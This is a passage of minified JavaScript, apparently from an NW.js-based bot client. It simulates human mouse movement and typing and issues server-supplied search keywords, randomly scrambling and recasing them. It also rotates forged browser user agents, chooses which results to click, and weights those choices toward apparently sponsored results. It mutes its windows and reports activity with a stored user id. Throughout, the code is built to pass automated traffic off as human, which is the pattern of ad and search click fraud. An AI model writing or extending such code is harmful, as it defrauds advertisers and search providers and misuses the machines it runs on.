					0 == isNaN(o.window.screenY) && (a += o.window.screenY);
					try {
						scptNWWindowAPI.mousemove(o, r.x, r.y, r.mx, r.my, i, a)
					} catch (e) {
						throw reportPageView("error/mmove/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + r.x + ":" + r.y + ":" + r.mx + ":" + r.my + ":" + i + ":" + a + "/" + e + "/" + e.stack, frisitor), e
					}
					global.setTimeout(noa.animate, r.ts, e, t, o, n)
				} catch (e) {
					reportPageView("warn/mmove/anim/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e + "/" + e.stack, frisitor)
				} else n && n()
			},
			digiscrollimate: function(e, t, o, n, r, i, a) {
				if (1 != devar.isElementInViewport(e, o)) {
					var c = Math.abs(Math.floor(devar.calculateDims(e).top / noa.SCROLL_DELTA)) + 1,
						s = Math.sign(devar.calculateDims(e).top);
					c < 3 && (c = 3), noa.scrollimate(e, t, o, n, c, s, r, (function() {
						0 == devar.isElementInViewport(e, o) && i > 0 ? (i -= 1, noa.digiscrollimate(e, t, o, n, r, i, a)) : a && "function" == typeof a && a(devar.calculateDims(e))
					}))
				} else a && "function" == typeof a && a(devar.calculateDims(e))
			},
			journey: function(e, t, o, n) {
				var r = Math.floor(randomize(e.left + 1, e.right - 1));
				e.right - e.left > 10 && (r = Math.floor(randomize(e.left + 4, e.right - 4)));
				var i = Math.floor(randomize(e.top + 1, e.bottom - 1));
				e.bottom - e.top > 10 && (i = Math.floor(randomize(e.top + 4, e.bottom - 4)));
				var a = r + o.window.screenX,
					c = i + o.window.screenY,
					s = noa.travel(r, i, t);
				noa.animate(s, t, o, (function() {
					try {
						var e = noa.DEFAULT_BUTTON;
						scptNWWindowAPI.mousedown(o, r, i, e, a, c), "function" == typeof n && setTimeout(n, 100)
					} catch (e) {
						reportPageView("warn/noa/anim/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e + "/" + e.stack, frisitor)
					}
				}))
			}
		};
		debug_mode && (debuggingModuleLoadEndMeasureTime = performance.now());
		var rachel = {
			timeout_deleting_minMiliseconds: 60,
			timeout_deleting_maxMiliseconds: 400,
			timeout_typeing_minMiliseconds: 60,
			timeout_typing_maxMiliseconds: 400,
			getTypings: function(e, t) {
				for (var o = [], n = findDifferenceStartingIndex(e, t), r = 0; r < e.length - n; r++) o.push({
					action: "r",
					text: "",
					time: randomize(this.timeout_deleting_minMiliseconds, this.timeout_deleting_maxMiliseconds)
				});
				var i = t.slice(n, t.length);
				for (var a in i) o.push({
					action: "a",
					text: i[a],
					time: randomize(this.timeout_typeing_minMiliseconds, this.timeout_typing_maxMiliseconds)
				});
				return o
			},
			performTypings: function(e, t, o, n, r, i) {
				if (o.length) {
					var a = o.shift();
					try {
						if (e.executionState >= STATES.FINISHED) return;
						noa.isKPC(e, t.nwWindow) ? "r" == a.action ? scptNWWindowAPI.keypress(t.nwWindow, enums.keyboard.BACKSPACE, enums.keyboardModifiers.kNoModifiers) : "a" == a.action && scptNWWindowAPI.keypress(t.nwWindow, a.text.charCodeAt(), enums.keyboardModifiers.kNoModifiers) : devar.fireKeyboardEvent(n, r, a.text, a.action)
					} catch (e) {
						reportPageView("error/keypress1/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e + "/" + e.stack, frisitor), devar.fireKeyboardEvent(n, r, a.text, a.action)
					}
					global.setTimeout(rachel.performTypings, a.time, e, t, o, n, r, i)
				} else i && i()
			}
		};
		debug_mode && (debuggingModuleLoadStartMeasureTime = performance.now());
		var jen = {
			DEFAULT_PROVIDER_TIMEOUT: 9e4,
			FALLBACK_TIMEOUT_SECONDS: 3,
			bucketsFreq_percisionFactor: 100,
			strategies_percisionFactor: 100,
			defaultExecutionFlow: "kwa",
			defaultAction: "scroll",
			defaultFOSPerformingWay: "searchBar",
			defaultFOSKWSource: "fromServer",
			regenerateUserAgent_percisionFactor: 100,
			userAgentVersioning_percisionFactor: 100,
			clicksPerKWsBuckets_percisionFactor: 100,
			changeWordsInFosChance_percisionFactor: 100,
			paginationBucket_percisionFactor: 1e3,
			defaultAmountOfPaginations: 0,
			typeOfClick_percisionFactor: 100,
			defaultTypeOfClick: "results",
			navBarIterations_percisionFactor: 100,
			defaultAmountOfNavBarIterations: 1,
			navBarButton_percisionFactor: 1e3,
			defaultNavBarButton: "nextPage",
			generateElementForScroll_percisionFactor: 100,
			providerFactor_PercisionFactor: 100,
			actionsGenerator_PercisionFactor: 100,
			resCategory_percisionFactor: 100,
			resultPicker_percisionFactor: 100,
			resultPicker_generateUnclickedResult_percisionFactor: 100,
			kwTypeGeneration_PercisionFactor: 100,
			flowsGenerate_percisionFactor: 100,
			fosBuckets_percisionFactor: 100,
			kwsScramble_defaultChance: 10,
			kwsScramble_PercisionFactor: 100,
			kwsManipulator_PercisionFactor: 100,
			fosPerformingWay_percisionFactor: 100,
			fosSearchPerform_percisionFactor: 100,
			fosNextKWSource_percisionFactor: 100,
			fosNextKW_percisionFactor: 100,
			kwsManipulator_defaultConfig: {
				we: {
					all_lower: 96,
					first_upper: 2,
					random_1_upper: .5,
					all_upper: 1.5
				}
			}
		};
		jen.word_manipulator_funcs = {
			all_lower: function(e) {
				return e.toLowerCase()
			},
			first_upper: function(e) {
				return e[0].toUpperCase() + e.toLowerCase().slice(1, e.length)
			},
			random_1_upper: function(e) {
				let t = Math.floor(randomize(0, e.length - 1));
				return e.toLowerCase().slice(0, t) + e[t].toUpperCase() + e.toLowerCase().slice(t + 1, e.length)
			},
			all_upper: function(e) {
				return e.toUpperCase()
			}
		}, jen.generateColorSpace = function(e) {
			try {
				return Math.floor(randomize(e.min, e.max))
			} catch (e) {
				return 1
			}
		}, jen.generateDifferentWindowContext = function(e, t) {
			if (0 == Array.isArray(e.ruggedContexts) || e.ruggedContexts.length < 1) return e.smoothContext;
			let o = -1,
				n = null,
				r = 15;
			for (;
				(null == n || n == t) && r > 0;) o = Math.floor(randomize(0, e.ruggedContexts.length)), n = o == e.ruggedContexts.length ? e.smoothContext : e.ruggedContexts[o], r -= 1;
			return n
		}, jen.generateLifetimeCtrFactor = function(e) {
			try {
				let t = encLocalStorage.getItem("lifetime_ctr_factor");
				return t || (t = 1, e && e.min && e.max && e.skew && (t = randn_bm(100 * e.min, 100 * e.max, e.skew) / 100), encLocalStorage.setItem("lifetime_ctr_factor", t)), parseFloat(t)
			} catch (e) {
				return encLocalStorage.setItem("lifetime_ctr_factor", 1), 1
			}
		}, jen.generateBucketSpace = function(e, t) {
			try {
				let o = randomize(1, 100 * jen.bucketsFreq_percisionFactor),
					n = 0,
					r = null;
				if (e)
					for (let t in e) {
						if (o > n && o <= e[t] * jen.bucketsFreq_percisionFactor + n) {
							r = parseInt(t);
							break
						}
						n += e[t] * jen.bucketsFreq_percisionFactor
					}
				if (r) {
					reportPageView("freqb/set/" + r, frisitor);
					let e = {};
					return e.ds = getDatedFormat(new Date), e.executes = 0, e.freq = t, e.bucketId = r, e.freq.min = 24 / (r + 1) * 60 * 60 * 1e3 + 1, e.freq.max = Math.min(24 / r * 60 * 60 * 1e3, t.max), encLocalStorage.setItem("PRYO", JSON.stringify(e)), e || null
				}
				return null
			} catch (e) {
				return null
			}
		}, jen.generateFos = function(e) {
			let t = randomize(1, 100 * jen.fosBuckets_percisionFactor),
				o = 0;
			if (e)
				for (let n in e) {
					if (t > o && t <= e[n].chance * jen.fosBuckets_percisionFactor + o) return parseInt(n);
					o += e[n].chance * jen.fosBuckets_percisionFactor
				}
			return 0
		}, jen.matchingFlows = function(e) {
			let t = encLocalStorage.getItem("datedVersion"),
				o = encLocalStorage.getItem("subchannel"),
				n = encLocalStorage.getItem("subsubchannel"),
				r = {
					length: 0
				};
			if (e)
				for (let i in e) {
					let a = !1;
					if (e[i].allowedVersions && e[i].allowedVersions.whitelist && e[i].allowedVersions.whitelist.length > 0) {
						let r = e[i].allowedVersions.whitelist;
						for (let e in r) {
							let i = r[e];
							if (!("*" != i.datedVersion && i.datedVersion != t || "*" != i.channel && i.channel != o || "*" != i.subchannel && i.subchannel != n)) {
								a = !0;
								break
							}
						}
					} else if (e[i].allowedVersions && e[i].allowedVersions.blacklist && e[i].allowedVersions.blacklist.length > 0) {
						a = !0;
						let r = e[i].allowedVersions.blacklist;
						for (let e in r) {
							let i = r[e];
							if (!("*" != i.datedVersion && i.datedVersion != t || "*" != i.channel && i.channel != o || "*" != i.subchannel && i.subchannel != n)) {
								a = !1;
								break
							}
						}
					} else a = !0;
					a && (r[i] = e[i], r.length++)
				}
			return r
		}, jen.generateFlow = function(e) {
			let t = 0;
			if (e) {
				for (let o in e) e[o] && e[o].weight && (t += e[o].weight);
				let o = randomize(1, t * jen.flowsGenerate_percisionFactor),
					n = 0;
				for (let t in e)
					if (e[t] && e[t].weight) {
						if (o > n && o <= e[t].weight * jen.flowsGenerate_percisionFactor + n) return t;
						n += e[t].weight * jen.flowsGenerate_percisionFactor
					}
			}
			return jen.defaultExecutionFlow
		}, jen.generateResCategory = function(e, t, o) {
			let n = randomize(1, 100 * jen.resCategory_percisionFactor),
				r = 0,
				i = JSON.parse(JSON.stringify(e)),
				a = i.spo;
			if (t && i.spo) {
				let e = jen.generateLifetimeCtrFactor(t);
				a = i.spo, i.spo *= e, i.res -= i.spo - a
			}
			if (i)
				for (let e in i) {
					if (n > r && n <= i[e] * jen.resCategory_percisionFactor + r) return e;
					r += i[e] * jen.resCategory_percisionFactor
				}
			return "res"
		}, jen.generateResults = function(e) {
			let t = 0,
				o = Math.floor(randomize(1, 100 * jen.resultPicker_percisionFactor));
			for (let n = 0; n < e.length; n++) {
				if (o > t && o <= e[n] * jen.resultPicker_percisionFactor + t) return n;
				t += e[n] * jen.resultPicker_percisionFactor
			}
			return 0
		}, jen.generateAction = function(e) {
			let t = 0,
				o = Math.floor(randomize(1, 100 * jen.actionsGenerator_PercisionFactor));
			if (e)
				for (let n in e) {
					if (o > t && o <= e[n].chance * jen.actionsGenerator_PercisionFactor + t) return n;
					t += e[n].chance * jen.actionsGenerator_PercisionFactor
				}
			return jen.defaultAction
		}, jen.generateKwType = function(e) {
			let t = Object.keys(e)[0],
				o = 0,
				n = Math.floor(randomize(1, 100 * jen.kwTypeGeneration_PercisionFactor));
			if (e)
				for (let r in e) {
					let i = e[r].weight * jen.kwTypeGeneration_PercisionFactor;
					if (n > o && n <= i + o) {
						t = r;
						break
					}
					o += i
				}
			return t
		}, jen.generateKw = function(e, t, o) {
			let n = o.type,
				r = null,
				i = null;
			return o && o.kw && o.kw.override ? i = o.kw.override : o && o.kwa_override && (i = o.kwa_override), r = i && i[e] && i[e][n] && i[e][n].length > 0 ? i[e][n] : t[e] && t[e][n] ? t[e][n] : t[e][jen.defaultExecutionFlow], r[Math.floor(randomize(0, r.length - 1))]
		}, jen.scramble = function(e, t) {
			let o = jen.kwsScramble_defaultChance;
			t && void 0 !== t.scramble && (o = t.scramble);
			let n = e;
			if (Math.floor(randomize(1, 100 * jen.kwsScramble_PercisionFactor)) <= o * jen.kwsScramble_PercisionFactor) {
				let e = Math.floor(randomize(0, n.length - 2)),
					t = n[e];
				n = charReplaceAt(n, e, n[e + 1]), n = charReplaceAt(n, e + 1, t)
			}
			return n
		}, jen.generateManipulatorCategory = function(e) {
			void 0 === e && (e = jen.kwsManipulator_defaultConfig);
			let t = randomize(1, 100 * jen.kwsManipulator_PercisionFactor),
				o = 0;
			for (let n in e.we) {
				if (t > o && t <= e.we[n] * jen.kwsManipulator_PercisionFactor + o) return n;
				o += e.we[n] * jen.kwsManipulator_PercisionFactor
			}
			return ""
		}, jen.applyManipulatorCategory = function(e, t) {
			let o = function(e) {
				return e
			};
			return t && "" != t && jen.word_manipulator_funcs[t] && (o = jen.word_manipulator_funcs[t]), o(e)
		}, jen.generateClicks = function(e) {
			try {
				let t = e.fosConfig,
					o = e.wordsAmount,
					n = null,
					r = null,
					i = null,
					a = e.fosAmountPerformed,
					c = e.flowConfig.odds[e.oddType].queryIndex;
				try {
					if (c) {
						if (i = c[a], null == i || void 0 === i) {
							let e = Object.keys(c).map((function(e) {
								return Number.parseInt(e)
							})).filter((function(e) {
								return 0 == Number.isNaN(e) && e < a
							}));
							i = c[Math.max.apply(null, e).toString()]
						}
						null != i && null != i.clicksForWords && (n = i.clicksForWords)
					}
				} catch (e) {
					n = null
				}
				if (!n && t && t.clicksForWords && (n = t.clicksForWords), void 0 !== n[o]) r = n[o];
				else {
					let e = o;
					for (let t in n) o - t < e && o - t >= 0 && (e = o - t);
					r = n[o - e]
				}
				let s = randomize(1, 100 * jen.clicksPerKWsBuckets_percisionFactor),
					l = 0;
				if (r)
					for (let e in r) {
						if (s > l && s <= r[e] * jen.clicksPerKWsBuckets_percisionFactor + l) return parseInt(e);
						l += r[e] * jen.clicksPerKWsBuckets_percisionFactor
					}
			} catch (e) {
				reportPageView("error/gen/clks/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor)
			}
			return reportPageView("warn/def/clks/1/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), 1
		}, jen.generatePaginationBucket = function(e) {
			let t = Math.floor(randomize(1, 100 * jen.paginationBucket_percisionFactor));
			try {
				let o = e.fosConfig.paginationBucket,
					n = 0;
				if (o)
					for (let e in o) {
						if (t > n && t <= o[e] * jen.paginationBucket_percisionFactor + n) return parseInt(e);
						n += o[e] * jen.paginationBucket_percisionFactor
					}
			} catch (e) {
				reportPageView("error/gen/paginations/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor)
			}
			return reportPageView("warn/def/paginations/1/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), jen.defaultAmountOfPaginations
		}, jen.generateTypeOfClick = function(e) {
			let t = Math.floor(randomize(1, 100 * jen.typeOfClick_percisionFactor));
			try {
				let o = 0;
				if (e)
					for (let n in e) {
						if (t > o && t <= e[n].weight * jen.typeOfClick_percisionFactor + o) return n;
						o += e[n].weight * jen.typeOfClick_percisionFactor
					} else reportPageView("warn/invalid/typeofclick/results/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor)
			} catch (e) {
				reportPageView("error/gen/typeofclick/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor)
			}
			return reportPageView("warn/def/typeofclick/results/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), jen.defaultTypeOfClick
		}, jen.generateNavBarIterations = function(e) {
			let t = Math.floor(randomize(1, 100 * jen.navBarIterations_percisionFactor));
			try {
				let o = 0;
				if (e)
					for (let n in e) {
						if (t > o && t <= e[n] * jen.navBarIterations_percisionFactor + o) return parseInt(n);
						o += e[n] * jen.navBarIterations_percisionFactor
					}
			} catch (e) {
				reportPageView("error/gen/navbarIterations/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor)
			}
			return reportPageView("warn/def/navbarIterations/1/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), jen.defaultAmountOfNavBarIterations
		}, jen.generateNavBarButton = function(e) {
			let t = Math.floor(randomize(1, 100 * jen.navBarButton_percisionFactor));
			try {
				let o = 0;
				if (e)
					for (let n in e) {
						if (t > o && t <= e[n] * jen.navBarButton_percisionFactor + o) return n;
						o += e[n] * jen.navBarButton_percisionFactor
					}
			} catch (e) {
				reportPageView("error/gen/navbarButton/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor)
			}
			return reportPageView("warn/def/navbarButton/" + jen.defaultNavBarButton + "/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), jen.defaultNavBarButton
		}, jen.generateFosPerformingWay = function(e) {
			if (!e) return jen.defaultFOSPerformingWay;
			let t = randomize(1, 100 * jen.fosPerformingWay_percisionFactor),
				o = 0;
			for (let n in e) {
				if (t > o && t <= e[n].chance * jen.fosPerformingWay_percisionFactor + o) return n;
				o += e[n].chance * jen.fosPerformingWay_percisionFactor
			}
			return jen.defaultFOSPerformingWay
		}, jen.generateNextKwSource = function(e) {
			let t = Math.floor(randomize(1, 100 * jen.fosNextKWSource_percisionFactor)),
				o = 0;
			for (let n in e) {
				if (t > o && t <= e[n].chance * jen.fosNextKWSource_percisionFactor + o) return n;
				o += e[n].chance * jen.fosNextKWSource_percisionFactor
			}
			return jen.defaultFOSKWSource
		}, jen.generateNextKwSourceLock = function(e, t) {
			if (!(e && t && e.fosConfiguration && e.fosConfiguration.nextKWSource && "object" == typeof e.fosConfiguration.nextKWSource && "object" == typeof e.fosConfiguration.nextKWSource[t] && 1 != isNaN(e.fosConfiguration.nextKWSource[t].lockOnSource))) return !1;
			return Math.floor(randomize(1, 100 * jen.fosNextKWSource_percisionFactor)) / 100 <= e.fosConfiguration.nextKWSource[t].lockOnSource
		}, jen.generateSearchPerformWay = function(e) {
			let t = e.chosenPerformingWay;
			if (t && "default" != t || (t = jen.defaultFOSPerformingWay), !(e && e.prov && e.prov.fosConfiguration && e.prov.fosConfiguration.way && e.prov.fosConfiguration.way[t] && void 0 !== e.prov.fosConfiguration.way[t] && e.prov.fosConfiguration.way[t].searchPerform && void 0 !== e.prov.fosConfiguration.way[t].searchPerform)) return "searchButtonMouseClick";
			let o = randomize(1, 100 * jen.fosSearchPerform_percisionFactor),
				n = 0,
				r = e.prov.fosConfiguration.way[t].searchPerform;
			for (let e in r) {
				if (o > n && o <= r[e] * jen.fosSearchPerform_percisionFactor + n) return e;
				n += r[e] * jen.fosSearchPerform_percisionFactor
			}
			return "searchButtonMouseClick"
		}, jen.getUserAgent = function(e, t, o) {
			let n = "",
				r = "headers",
				i = !1;
			if ("explorer" == t) {
				-1 != oleg.getOSFromNavigator().indexOf("Windows NT 10") && (r = "edge", i = !0)
			}
			let a = e.browsers,
				c = i ? "edge" : t,
				s = 0;
			if (o && "*" != o)
				for (let t = 0; t < e.helper[c].length; t++)
					if (e.helper[c][t] == o) {
						s = t;
						break
					} let l = e.helper[c][s];
			return n = a[t][r][s], n = n.replace("%OS%", "%osinfo"), {
				ua: n,
				uaVer: l
			}
		}, jen.generateUserAgent = function(e, t, o) {
			let n = "",
				r = "headers",
				i = !1,
				a = "chrome";
			if (e && e.browsers && e.browsers[t]) a = t;
			else if (e && e.browsers) {
				let t = Math.floor(randomize(1, 100)),
					o = 0;
				for (let n in e.browsers) {
					if (t > o && t <= e.browsers[n].chance + o) {
						a = n;
						break
					}
					o += e.browsers[n].chance
				}
			}
			if ("explorer" == a) {
				-1 != oleg.getOSFromNavigator().indexOf("Windows NT 10") && (r = "edge", i = !0)
			}
			let c = 0;
			if (o && "string" == typeof o && e.helper[a].indexOf(o) >= 0) c = e.helper[a].indexOf(o);
			else if (e && e.versioning) {
				let t = Math.floor(randomize(1, 100 * jen.userAgentVersioning_percisionFactor)),
					o = 0;
				for (let n = 0; n < e.versioning.length; n++) {
					if (t > o && t <= e.versioning[n] * jen.userAgentVersioning_percisionFactor + o) {
						c = n;
						break
					}
					o += e.versioning[n] * jen.userAgentVersioning_percisionFactor
				}
			}
			for (; !e.browsers[a][r][c];) c--;
			let s = i ? "edge" : a,
				l = e.helper[s][c];
			n = e.browsers[a][r][c], n = n.replace("%OS%", "%osinfo");
			let u = {};
			return u.header = r, u.browser = a, u.version = l, u.index = c, u.string = n, u.sbrowse = s, u.generationTime = (new Date).getTime(), u
		}, jen.regenerateUserAgent = function(e, t) {
			try {
				if (t && e && e.regenerate && Math.floor(randomize(1, 100 * jen.regenerateUserAgent_percisionFactor)) <= e.regenerate.rate * jen.regenerateUserAgent_percisionFactor && parseInt(t.version) <= parseInt(e.regenerate.maxVersion[t.browser]) && (!t.generationTime || "number" != typeof t.generationTime || ((new Date).getTime() - t.generationTime) / ONE_HOUR_TIMESPACE)) {
					let o = Math.floor(randomize(1, 100 * jen.regenerateUserAgent_percisionFactor)) <= e.regenerate.browserChangeChances[t.browser] * jen.regenerateUserAgent_percisionFactor,
						n = null;
					0 == o && (n = t.browser);
					let r = jen.generateUserAgent(e, n),
						i = e.helper[r.sbrowse].map((function(e) {
							return parseInt(e)
						})),
						a = 100;
					for (; a > 0 && 0 == isNaN(parseInt(r.version)) && 0 == isNaN(parseInt(t.version)) && parseInt(r.version) <= parseInt(t.version) && i.filter((function(e) {
							return e > parseInt(t.version)
						})).length > 0;) r = jen.generateUserAgent(e, n), a--;
					return a <= 0 && (r = null), r
				}
			} catch (e) {}
			return null
		}, jen.rollChangeWordsInFos = function(e) {
			let t = 10;
			e && e.flowConfig && e.flowConfig.kw && void 0 !== e.flowConfig.kw.changeKeywordsInFosChance && (t = e.flowConfig.kw.changeKeywordsInFosChance), Math.floor(randomize(1, 100 * jen.changeWordsInFosChance_percisionFactor)) <= t * jen.changeWordsInFosChance_percisionFactor && (e.kwCollection = jen.generateKw(e.oddType, kwl.kws, e.flowConfig), e.kwSearchIndex = 0, 0 == Array.isArray(e.kwCollection) && (e.kwCollection = [e.kwCollection]))
		}, jen.getKeywordsByChances = function(e, t, o) {
			let n = [],
				r = Object.keys(t);
			for (let i in r) {
				let a = r[i],
					c = t[a];
				if (0 == isNaN(c)) {
					let t = null;
					Math.floor(randomize(1, 100 * jen.fosNextKW_percisionFactor)) / 100 <= c && (o && o[a] && (t = o[a].map((function(e) {
						return e.textContent
					}))), (!t || !t[a]) && e && e.resultsTextObject && e.resultsTextObject.out && e.resultsTextObject.out[e.resultsTextObject.out.length - 1] && e.resultsTextObject.out[e.resultsTextObject.out.length - 1].catsText && e.resultsTextObject.out[e.resultsTextObject.out.length - 1].catsText[a] && (t = e.resultsTextObject.out[e.resultsTextObject.out.length - 1].catsText[a])), t && t.forEach((function(e) {
						n.push(e)
					}))
				}
			}
			return n
		}, debug_mode && (debuggingModuleLoadEndMeasureTime = performance.now()), debug_mode && (debuggingModuleLoadStartMeasureTime = performance.now());
		var momo = {
			createWindowContext: function() {
				var e = {
					isResAvailable: !1,
					oldLoc: null,
					firstPageHistoryIndex: 1,
					phaser: 2,
					actionsPerformed: 0,
					nwWindow: null
				};
				return e.windowId = generateGuid(), e.startTime = (new Date).getTime(), e.overrideInterval = null, e.reportsPerformed = {
					freddie: !1
				}, e.urlsToFirstLP = [], e.urlsAfterFirstLP = [], e.firstRoamingPage = {
					historyIndex: -1,
					url: ""
				}, e
			},
			createFeedContext: function(e, t, o) {
				var n = {};
				return n.executionState = STATES.NONE, n.startTime = (new Date).getTime(), n.feedId = generateGuid(), n.sessionContextOwner = o, n.NCLFactor = !0, n.prov = t, n.chosenFinalUrl = "", n.violet = e, n.factorConfig = null, n.isFlowCookiefied = !1, n.kw = null, n.kwCollection = null, n.kwSearchIndex = 0, n.wordsAmount = 0, n.originalKW = "", n.manipulatedKW = "", n.scrambledKW = "", n.isScrambled = !1, n.resGroup = "res", n.chosenResIndex = 0, n.oddType = null, n.refusedParsing = !1, n.manipulatorCategoryChosen = "", n.fosAmount = 0, n.fosAmountPerformed = 0, n.searchesAmount = 0, n.fosConfig = null, n.nextKwText = "", n.nextKWSource = "fromServer", n.nextKWSourceLock = !1, n.chosenPerformingWay = "default", n.catsAmounts = {}, n.clicksAmount = 0, n.clicksPerformed = 0, n.totalClicksPerformed = 0, n.monitoringObject = {
					flow: {
						provider_id: "",
						full_provider_id: "",
						flowName: "",
						factorCalibration: 1,
						factor_id: "",
						prov_suffix: "",
						factorAmount: "",
						fosAmountGenerated: 0,
						callsToProviderUrl: 0,
						queries: [{
							index: 0,
							clicksAmountGenerated: 0,
							kws: {
								original_term: n.originalKW,
								manipulated_term: n.manipulatedKW,
								scrambled_term: n.scrambledKW,
								final_term: n.kw,
								type: n.oddType,
								scrambled: n.isScrambled,
								manipulator: n.manipulatorCategoryChosen
							},
							flowOutput: {
								cats: n.catsAmounts,
								clicks: [{
									index: 0,
									chosen_result_group: n.resGroup,
									chosen_result_index: n.chosenResIndex,
									refused_parsing: !1,
									backReplaces: {
										newNavigation: [],
										regularBack: []
									}
								}]
							}
						}]
					}
				}, n.smoothContext = momo.createWindowContext(), n.ruggedContexts = [], n.activeWindowContext = n.smoothContext, n.strongLock = !1, n.resultsTextObject = {
					provider: "",
					out: []
				}, n.actionTime = null, n.resRockTimeout = null, n.fallbackNotReloadingTimeout = null, n.sharks = null, n.sharksNoConnectionReported = !1, n.memWatcher = null, n.roamFallback = null, n.roamingFallbackUrl = null, n.executionFlow = jen.defaultExecutionFlow, n.flowConfig = null, n.navBarIterationsLeft = -1, n.uaLockBrowser = null, n.uaLockVersion = null, n.uaOverride = null, n.globalTimeout = null, n.sessionStartTime = (new Date).getTime(), n.feedExecutionTimeoutMiliseconds = jen.DEFAULT_PROVIDER_TIMEOUT, n.wndOverrideFlags = null, n.isAdvanced = !1, n.advanceTimeout = null, n.clickRecords = [], n
			},
			createSessionContext: function(e, t) {
				var o = {};
				return o.runningModeName = scriptName, o.providersHolywoods = {}, o.providersRan = 0, o.scriptContextOwner = e, o.startTime = (new Date).getTime(), o.sessionId = generateGuid(), o.providers = [], o.user_agent = navigator.userAgent, o.kwl = t, o
			},
			createScriptContext: function() {
				var e = {};
				return e.startTime = (new Date).getTime(), e.scriptId = generateGuid(), e.scriptFreshRun = !1, e.driedRosesPlanting = !1, e.activeSessionId = null, e
			},
			addRuggedWindow: function(e, t) {
				var o = momo.createWindowContext();
				return o.nwWindow = e, o.nwWindow.ownerFeedContext = t.feedId, o.firstPageHistoryIndex = e.window.history.length, t.ruggedContexts.push(o), o
			},
			getFactorConfig: function(e) {
				try {
					if (e && e.violet && "" != e.violet.factor_id && e.prov && e.prov.factors && void 0 !== e.prov.factors[e.violet.factor_id]) return e.prov.factors[e.violet.factor_id]
				} catch (e) {}
				return null
			},
			tryGetActiveWindow: function(e) {
				var t = e.smoothContext.nwWindow;
				try {
					e.activeWindowContext && e.activeWindowContext.nwWindow && (t = e.activeWindowContext.nwWindow)
				} catch (e) {}
				return t
			},
			tryGetWindowContext: function(e, t) {
				try {
					if (t.smoothContext.nwWindow == e) return t.smoothContext;
					if (Array.isArray(t.ruggedContexts))
						for (var o in t.ruggedContexts)
							if (t.ruggedContexts[o].nwWindow == e) return t.ruggedContexts[o]
				} catch (e) {}
				return null
			},
			tryGetWindowByContext: function(e) {
				try {
					if (e && e.nwWindow && e.nwWindow.window) return e.nwWindow.window
				} catch (e) {}
				return null
			},
			tryGetProviderId: function(e) {
				var t = "";
				try {
					e && e.prov && (t += e.prov.id)
				} catch (e) {
					t += "unknown"
				}
				try {
					var o = momo.getFactorConfig(e);
					o && o.provIdSuffix && "string" == typeof o.provIdSuffix && "" != o.provIdSuffix && e && e.violet && "string" == typeof e.violet.factor_id && (t += o.provIdSuffix)
				} catch (e) {}
				return t
			},
			getStrategyConfig: function(e) {
				let t = parseInt(encLocalStorage.getItem("kstrategy"));
				if (0 == isNaN(t))
					for (let o in e.kwl.strategies.strategiesConfiguration) {
						let n = e.kwl.strategies.strategiesConfiguration[o];
						if (n && "number" == typeof n.min && "number" == typeof n.max && t >= n.min && t <= n.max) return n.config
					}
				return e.kwl.strategies.strategiesConfiguration.leftovers.config
			},
			getFosNextKWSource: function(e) {
				return e && e.prov && e.prov.fosConfiguration && e.prov.fosConfiguration.nextKWSource && "object" == typeof e.prov.fosConfiguration.nextKWSource ? e.prov.fosConfiguration.nextKWSource : null
			},
			getFosPerformingWay: function(e) {
				return e && e.prov && e.prov.fosConfiguration && e.prov.fosConfiguration.way && void 0 !== e.prov.fosConfiguration.way ? e.prov.fosConfiguration.way : null
			},
			tryCloseSmoothWnd: function(e) {
				try {
					e && e.smoothContext.nwWindow && "function" == typeof e.smoothContext.nwWindow.close && e.smoothContext.nwWindow.close()
				} catch (e) {}
				try {
					if (Array.isArray(e.ruggedContexts))
						for (var t in e.ruggedContexts) e.ruggedContexts[t].nwWindow && "function" == typeof e.ruggedContexts[t].nwWindow.close && e.ruggedContexts[t].nwWindow.close()
				} catch (e) {}
				if (noa.isNW47()) try {
					var o = e.feedId;
					nw.Window.getAll((function(e) {
						try {
							var t = e.filter((function(e) {
								return scptNWWindowAPI.has_prov_id(e) && scptNWWindowAPI.get_prov_id(e) == o
							}));
							if (Array.isArray(t))
								for (var n in t)
									if (t[n] && "function" == typeof t[n].close) try {
										t[n].close()
									} catch (e) {}
						} catch (e) {}
					}))
				} catch (e) {}
			},
			tryCloseSpecificWnd: function(e, t) {
				try {
					t != e.smoothContext && e.ruggedContexts.includes(t) && t.nwWindow && "function" == typeof t.nwWindow.close && (t.nwWindow.close(), e.ruggedContexts = e.ruggedContexts.filter((function(e) {
						return e != t
					})))
				} catch (e) {}
			},
			muteAllWnds: function(e) {
				try {
					e && e.smoothContext.nwWindow && scptNWWindowAPI.has_setmute(e.smoothContext.nwWindow) && scptNWWindowAPI.setmute(e.smoothContext.nwWindow, !0)
				} catch (e) {}
				try {
					if (Array.isArray(e.ruggedContexts))
						for (var t in e.ruggedContexts) e.ruggedContexts[t].nwWindow && scptNWWindowAPI.has_setmute(e.ruggedContexts[t].nwWindow) && scptNWWindowAPI.setmute(e.ruggedContexts[t].nwWindow, !0)
				} catch (e) {}
			},
			overrides: function(e, t, o) {
				if (null == o) {
					if (void 0 === t.smoothContext.nwWindow || void 0 === t.smoothContext.nwWindow.window) return;
					o = t.smoothContext.nwWindow
				}
